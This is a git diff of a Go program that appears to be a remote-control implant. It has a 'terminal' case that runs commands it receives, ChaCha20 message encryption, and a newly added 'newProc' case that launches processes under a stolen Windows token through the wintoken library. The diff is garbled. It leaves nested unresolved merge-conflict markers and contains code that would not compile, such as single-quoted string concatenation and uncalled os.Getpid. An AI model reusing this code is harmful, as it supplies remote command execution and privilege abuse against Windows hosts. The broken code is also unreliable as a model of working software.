@@ -20,7 +20,10 @@ import (
 	"time"
 
 	"golang.org/x/crypto/chacha20poly1305"
+<<<<<<< HEAD
 <<<<<<< Updated upstream
+=======
+>>>>>>> 84a6e5a323b0e9d823dd5d5a4f3e8968fc53538e
 	"github.com/fourcorelabs/wintoken"
 )
 
@@ -34,6 +37,7 @@ func new_process_new_token(token int, path string){
 	cmd := exec.Command(path)
 	cmd.SysProcAttr = &syscall.SysProcAttr{Token: syscall.Token(token.Token())}
 }
+<<<<<<< HEAD
 =======
 	//"golang.org/x/sys/windows"
 )
@@ -41,6 +45,8 @@ func new_process_new_token(token int, path string){
 
 
 >>>>>>> Stashed changes
+=======
+>>>>>>> 84a6e5a323b0e9d823dd5d5a4f3e8968fc53538e
 
 func chacha(pass string, msg string) (enc_block []byte) {
 
@@ -226,6 +232,7 @@ func main() {
 		case "terminal":
 			commandToRun := strings.Join(sb1, ",")
 			result = terminal(commandToRun)
+<<<<<<< HEAD
 <<<<<<< Updated upstream
 		case "newProc":
 			path := sb1[1:]
@@ -237,6 +244,17 @@ func main() {
 		//case "groups":
 		//    result := getGroups()
 >>>>>>> Stashed changes
+=======
+		case "newProc":
+			path := sb1[1:]
+			new_process_new_token(0, path)
+		case "pid":
+		    	cPID := os.Getpid
+		    	pPID := os.Getppid
+		    	sCPID := strconv.Itoa(cPID)
+		    	cPPID := strconv.Itoa(pPID)
+		    	result = sCPID + ', ' + cPPID
+>>>>>>> 84a6e5a323b0e9d823dd5d5a4f3e8968fc53538e
 		}
 		toSend := string(result)
 		fmt.Printf(toSend)
